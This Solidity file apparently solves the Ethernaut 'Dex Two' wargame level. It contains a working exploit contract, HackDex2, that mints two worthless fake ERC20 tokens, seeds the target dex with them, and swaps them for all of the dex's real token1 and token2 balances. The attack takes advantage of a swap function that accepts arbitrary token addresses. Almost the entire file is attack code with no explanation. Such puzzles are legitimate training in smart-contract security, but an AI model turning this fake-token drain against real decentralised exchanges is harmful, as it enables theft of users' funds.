// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./Dex2.sol";

/**
 * @dev Create 2 fakes token and use them to retreive all the funds
 */

contract HackDex2 {

    constructor(DexTwo dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        FakeToken fakeToken1 = new FakeToken();
        FakeToken fakeToken2 = new FakeToken();

        // Keep 1, send 1 to dex
        fakeToken1.mint(address(this), 1);
        fakeToken2.mint(address(this), 1);
        fakeToken1.mint(address(dex), 1);
        fakeToken2.mint(address(dex), 1);

        fakeToken1.approve(address(dex), 1);
        fakeToken2.approve(address(dex), 1);

        dex.swap(address(fakeToken1), address(token1), 1);
        dex.swap(address(fakeToken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
    }
}

contract FakeToken is ERC20 {
    constructor()
        ERC20("FakeToken", "FTK")
    {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}